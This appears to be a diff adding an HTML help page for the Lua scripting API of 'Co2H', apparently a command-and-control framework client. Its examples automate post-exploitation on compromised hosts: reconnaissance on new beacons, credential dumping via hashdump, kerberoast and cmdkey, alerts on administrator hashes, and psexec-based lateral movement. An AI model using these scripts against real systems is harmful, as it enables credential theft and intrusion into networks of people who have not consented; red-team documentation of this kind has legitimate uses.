@@ -1,0 +1,225 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<title>Lua Scripting — Co2H</title>
+<link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+<nav class="crumbs"><a href="index.html">Co2H</a> › <a href="ui-overview.html">Operator Interface</a> › Lua Scripting</nav>
+
+<h1>Lua Scripting</h1>
+
+<p>Co2H contains a built-in Lua 5.4 engine that allows automating operator actions
+without recompiling the client. Scripts react to events (new beacon, task output, chat),
+register custom commands in the console and send tasks to beacons.</p>
+
+<div class="note">Scripts run on the client side, not on the server or the beacon.
+They automate what the operator would do manually in the console.</div>
+
+<h2 id="location">Script Location</h2>
+
+<p>Scripts are stored in the <code>scripts/</code> folder alongside <code>co2h-client.exe</code>:</p>
+
+<pre>bin/
+  co2h-client.exe
+  scripts/
+    auto_enum.lua
+    grab_creds.lua
+    my_workflow.lua</pre>
+
+<p>All <code>*.lua</code> files from this folder are loaded automatically on client startup.
+Files with the <code>.lua.example</code> extension are ignored — they are used as templates.</p>
+
+<p>Scripts can also be loaded and reloaded at any time from the
+<a href="#tab">Scripts</a> tab without restarting the client.</p>
+
+<h2 id="tab">Scripts Tab</h2>
+
+<p>The <b>Scripts</b> tab is located between Audit and Logs in the main tab panel.</p>
+
+<table>
+<tr><th>Element</th><th>Purpose</th></tr>
+<tr><td>List (top half)</td><td>Loaded <code>.lua</code> files</td></tr>
+<tr><td>Log (bottom half)</td><td>Output from <code>log()</code> calls in scripts with timestamps</td></tr>
+<tr><td>Load script...</td><td>Open a file dialog to load a <code>.lua</code> file</td></tr>
+<tr><td>Reload all</td><td>Reload all scripts from <code>scripts/</code> and manually loaded ones</td></tr>
+<tr><td>Open scripts folder</td><td>Open the <code>scripts/</code> folder in Explorer</td></tr>
+</table>
+
+<h2 id="api">Scripting Engine API</h2>
+
+<h3 id="api-task">task(beacon_id, cmd_text)</h3>
+<p>Send a command to a beacon. Equivalent to the operator typing a command in the console.</p>
+<pre>task("abc123", "shell whoami")
+task("abc123", "ps")
+task("abc123", "hashdump 2")</pre>
+
+<div class="note"><code>beacon_id</code> — string, the beacon identifier (first column of the Sessions tab).
+The command goes through the same dispatcher as manual input: all arguments, syntax
+and behavior are identical.</div>
+
+<h3 id="api-log">log(text)</h3>
+<p>Write a line to the Scripts tab log and to the Logs panel.</p>
+<pre>log("enumeration started on " .. bid)
+log("found " .. count .. " processes")</pre>
+
+<h3 id="api-alert">alert(title, text)</h3>
+<p>Show a popup window to the operator.</p>
+<pre>alert("High-value target", "Administrator hash found on " .. bid)</pre>
+
+<h3 id="api-beacons">beacons()</h3>
+<p>Return a table (array) of all active beacons at the time of the call.</p>
+<pre>for _, b in ipairs(beacons()) do
+    log(b.id .. " — " .. b.user .. "@" .. b.host)
+end</pre>
+
+<p>Fields of each element:</p>
+<table>
+<tr><th>Field</th><th>Type</th><th>Description</th></tr>
+<tr><td><code>id</code></td><td>string</td><td>Beacon identifier</td></tr>
+<tr><td><code>host</code></td><td>string</td><td>Target hostname</td></tr>
+<tr><td><code>user</code></td><td>string</td><td>Current user on the target</td></tr>
+<tr><td><code>arch</code></td><td>string</td><td><code>"x64"</code> or <code>"x86"</code></td></tr>
+<tr><td><code>os</code></td><td>string</td><td><code>"windows"</code> or <code>"linux"</code></td></tr>
+<tr><td><code>pid</code></td><td>integer</td><td>PID of the beacon process</td></tr>
+<tr><td><code>listener</code></td><td>string</td><td>Listener name</td></tr>
+</table>
+
+<h3 id="api-on">on(event_name, callback)</h3>
+<p>Subscribe to an event. A single script can register multiple handlers
+for the same event; all of them will be called.</p>
+<pre>on("beacon_new", function(b)
+    -- b.id, b.host, b.user, b.arch, b.os
+end)
+
+on("task_output", function(bid, tid, output)
+    -- bid    — string: beacon_id
+    -- tid    — number: task_id
+    -- output — string: output text
+end)
+
+on("beacon_lost", function(bid)
+    -- bid — string: beacon_id of the lost beacon
+end)
+
+on("chat", function(from, text)
+    -- from — operator name
+    -- text — message text
+end)</pre>
+
+<h3 id="api-command">command(name, help, callback)</h3>
+<p>Register a custom command in the beacon console. After the script is loaded,
+the command is available in auto-completion alongside the built-in commands.</p>
+<pre>command("enum", "Run full host enumeration", function(bid, args)
+    task(bid, "whoami")
+    task(bid, "shell ipconfig /all")
+    task(bid, "shell net user")
+    task(bid, "ps")
+    log("[enum] started on " .. bid)
+end)</pre>
+
+<p>Callback parameters:</p>
+<table>
+<tr><th>Parameter</th><th>Description</th></tr>
+<tr><td><code>bid</code></td><td>Identifier of the beacon whose console is currently active</td></tr>
+<tr><td><code>args</code></td><td>Everything written after the command name (string, may be empty)</td></tr>
+</table>
+
+<h2 id="events">Events</h2>
+
+<table>
+<tr><th>Event</th><th>When Fired</th><th>Callback Arguments</th></tr>
+<tr><td><code>beacon_new</code></td><td>Client detected a new beacon on the next server poll</td><td><code>b</code> — table with fields id, host, user, arch, os</td></tr>
+<tr><td><code>beacon_lost</code></td><td>Beacon disappeared from the list (timeout &gt; 3 minutes)</td><td><code>bid</code> — string</td></tr>
+<tr><td><code>task_output</code></td><td>Output for any task received from the server</td><td><code>bid, tid, output</code></td></tr>
+<tr><td><code>chat</code></td><td>A chat message received from any operator</td><td><code>from, text</code></td></tr>
+</table>
+
+<div class="note"><b>Important:</b> scripts are loaded on client startup precisely to register
+<code>beacon_new</code> handlers before any beacons appear.
+If a script is loaded later — already connected beacons are missed, but new ones will be handled.</div>
+
+<h2 id="examples">Examples</h2>
+
+<h3>Automatic Reconnaissance on New Beacon</h3>
+<pre>on("beacon_new", function(b)
+    log("[auto] new beacon: " .. b.user .. "@" .. b.host .. " (" .. b.arch .. ")")
+    task(b.id, "whoami")
+    task(b.id, "ps")
+    task(b.id, "pwd")
+    if b.os == "windows" then
+        task(b.id, "shell net user")
+        task(b.id, "shell ipconfig /all")
+    end
+end)</pre>
+
+<h3>Alert When Administrator Hash is Found</h3>
+<pre>on("task_output", function(bid, tid, output)
+    if output:find("Administrator:500:") then
+        alert("High-value target", "Admin hash found on beacon " .. bid)
+        log("[!] admin hash on " .. bid)
+    end
+end)</pre>
+
+<h3>Custom Command for Credential Dumping</h3>
+<pre>command("grab", "Dump all credential sources", function(bid, args)
+    task(bid, "hashdump 2")
+    task(bid, "kerberoast")
+    task(bid, "shell cmdkey /list")
+    log("[grab] credential dump started on " .. bid)
+end)</pre>
+
+<h3>Custom Command with Arguments</h3>
+<pre>-- Usage: lateral 192.168.1.10 administrator
+command("lateral", "Quick lateral move: lateral &lt;ip&gt; &lt;user&gt;", function(bid, args)
+    local parts = {}
+    for w in args:gmatch("%S+") do parts[#parts+1] = w end
+    if #parts < 2 then
+        log("[lateral] usage: lateral &lt;ip&gt; &lt;user&gt;")
+        return
+    end
+    local ip, user = parts[1], parts[2]
+    task(bid, "psexec_cmd " .. ip .. " whoami")
+    log("[lateral] moving to " .. ip .. " as " .. user)
+end)</pre>
+
+<h3>List All Beacons from a Script</h3>
+<pre>command("listall", "Print all active beacons", function(bid, args)
+    local all = beacons()
+    log("Active beacons: " .. #all)
+    for _, b in ipairs(all) do
+        log("  " .. b.id .. " " .. b.user .. "@" .. b.host .. " [" .. b.arch .. "]")
+    end
+end)</pre>
+
+<h2 id="errors">Error Handling</h2>
+
+<p>If a Lua error occurs in a script (syntax or runtime), it does not
+crash the client. The error message is written to the Scripts tab log:</p>
+
+<pre>[03:52:24] [script] error loading my_script.lua: [string]:5: attempt to call a nil value</pre>
+
+<p>On error in an event callback:</p>
+
+<pre>[03:52:30] [script] beacon_new error: [string]:12: attempt to concatenate a nil value</pre>
+
+<div class="warning">An error in one callback does not block the other handlers for the same event —
+they will be called in the same order.</div>
+
+<h2 id="tips">Tips</h2>
+
+<ul>
+<li>Name scripts descriptively: <code>auto_enum.lua</code>, <code>alert_da.lua</code>, <code>grab_creds.lua</code></li>
+<li>One script — one task. Do not make a "mega-script" for every situation</li>
+<li>Use <code>log()</code> for diagnostics — output is visible in real time</li>
+<li>Before using <code>beacons()</code> in <code>beacon_new</code>, note that the new beacon
+    is already added to the list by the time the callback is called</li>
+<li>Example templates are provided with the <code>.lua.example</code> extension — copy,
+    rename to <code>.lua</code> and adapt</li>
+<li>To reload a script after editing — click <b>Reload all</b> in the Scripts tab</li>
+</ul>
+
+</body>
+</html>
